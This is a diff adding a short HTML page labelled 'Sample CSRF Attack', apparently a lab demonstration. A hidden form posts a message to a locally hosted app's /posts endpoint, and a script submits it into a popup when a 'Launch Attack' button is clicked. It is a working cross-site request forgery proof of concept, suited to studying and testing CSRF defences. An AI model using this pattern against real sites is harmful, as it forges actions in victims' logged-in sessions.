@@ -1,0 +1,24 @@
+<html>
+  <head>
+    Sample CSRF Attack
+  </head>
+  <body>
+    <form
+      id="evilform"
+      name="evilform"
+      action="http://127.0.0.1:5000/posts"
+      method="POST"
+      target="popup"
+    >
+      <input type="hidden" name="message" value="pop" />
+      <button type="button" onclick="submitForm()">Launch Attack</button>
+    </form>
+
+    <script>
+      function submitForm() {
+        const newWindow = window.open("", "popup", "width=200,height=200");
+        document.getElementById("evilform").submit();
+      }
+    </script>
+  </body>
+</html>
